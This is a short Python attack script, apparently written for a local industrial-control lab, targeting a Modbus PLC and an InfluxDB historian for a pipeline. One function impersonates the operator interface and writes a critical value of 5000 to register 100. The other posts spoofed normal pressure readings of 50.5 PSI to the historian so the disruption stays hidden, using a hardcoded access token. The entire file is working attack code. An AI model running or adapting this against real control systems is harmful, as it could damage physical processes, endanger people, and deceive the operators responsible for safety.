import time
from pymodbus.client import ModbusTcpClient
import requests

PLC_IP = '127.0.0.1' # Use 'ics_plc' if running inside docker network
INFLUX_URL = 'http://127.0.0.1:8086/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns'
INFLUX_TOKEN = 'supersecrettoken'
MODBUS_PORT = 5020 # Target PLC Port

def semantic_injection():
    print("[*] Initiating Semantic Injection...")
    # Masquerading as the legitimate HMI. Bypasses simple packet filters
    # because it is a completely valid Modbus TCP packet.
    # The "semantic" attack relies on the payload context: 5000 is a critical threshold.
    try:
        client = ModbusTcpClient(PLC_IP, port=MODBUS_PORT)
        if client.connect():
            print("[*] Connected to Modbus device. Sending Critical High Value (5000) to Register 100.")
            res = client.write_register(100, 5000)
            if not res.isError():
                print("[+] Semantic Injection Successful!")
            else:
                print("[-] Modbus Exception Error returned.")
            client.close()
        else:
            print("[-] Could not connect to Modbus TCP Server.")
    except Exception as e:
        print(f"[-] Error: {e}")

def replay_attack_historian():
    print("\n[*] Initiating Replay Attack to Historian...")
    # Suppose the attacker sends a "Stop" command to the PLC.
    # To mask the subsequent drop in pressure (or PLC unresponsiveness), 
    # the attacker replays captured benign telemetry to the Historian.
    
    headers = {
        'Authorization': f'Token {INFLUX_TOKEN}',
        'Content-Type': 'text/plain; charset=utf-8'
    }
    
    # Replaying captured normal data (50.5 PSI)
    normal_pressure_value = 50.5 
    
    for i in range(5):
        current_time_ns = time.time_ns()
        payload = f"pipeline_metrics,location=pump_station_01 pressure={normal_pressure_value} {current_time_ns}"
        
        try:
            response = requests.post(INFLUX_URL, headers=headers, data=payload)
            if response.status_code == 204:
                print(f"[+] Spoofed normal data to Historian: {normal_pressure_value} PSI")
            else:
                print(f"[-] Failed to spoof data. Status Code: {response.status_code} {response.text}")
        except Exception as e:
            print(f"[-] HTTP Connection failed: {e}")
        time.sleep(2)

if __name__ == "__main__":
    semantic_injection()
    time.sleep(1)
    replay_attack_historian()
